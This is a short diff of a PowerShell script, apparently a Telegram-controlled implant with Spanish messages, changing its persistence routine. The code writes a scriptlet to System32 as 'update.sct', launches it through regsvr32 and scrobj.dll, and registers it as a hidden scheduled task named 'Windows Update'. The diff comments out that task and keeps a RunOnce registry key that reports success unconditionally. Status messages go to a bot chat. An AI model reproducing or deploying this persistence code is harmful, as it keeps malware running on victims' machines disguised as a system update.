@@ -214,13 +214,13 @@ objShell.Run command,0
 Set objShell = Nothing'
 $plantilla_sct | Out-File -Encoding ascii "C:\Windows\System32\update.sct" 
 $accion = New-ScheduledTaskAction -Execute "c:\windows\system32\regsvr32.exe" -Argument "/s /n /u /i:c:\windows\system32\update.sct scrobj.dll"
-$desencadenante = New-ScheduledTaskTrigger -AtLogOn
-$tarea = New-ScheduledTask -Action $accion -Trigger $desencadenante -Settings (New-ScheduledTaskSettingsSet -Hidden)
-$tarea | Register-ScheduledTask -TaskName "Windows Update" | Out-Null; $texto = ""
-if ($? -eq $false) {$texto = "No se ha podido crear la persistencia, probaremos otro metodo."; envia-mensaje -text $texto -botkey $botkey -chat $chat_id;
+#$desencadenante = New-ScheduledTaskTrigger -AtLogOn
+#$tarea = New-ScheduledTask -Action $accion -Trigger $desencadenante -Settings (New-ScheduledTaskSettingsSet -Hidden)
+#$tarea | Register-ScheduledTask -TaskName "Windows Update" | Out-Null; $texto = ""
+#if ($? -eq $false) {$texto = "No se ha podido crear la persistencia, probaremos otro metodo."; envia-mensaje -text $texto -botkey $botkey -chat $chat_id;
 $key = "registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"; $modifica = "c:\windows\system32\regsvr32.exe /s /n /u /i:c:\windows\system32\update.sct scrobj.dll" ; set-item $Key $modifica
-} if ($? -eq $false) {$texto = "Por algun motivo no hemos podido crear pesistencia"} else {$texto = "Persistencia ejecutada correctamente"} return $texto;break}
-}
+$texto = "Persistencia ejecutada correctamente"} return $texto;break}
+
 
 function remove-persistence {
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
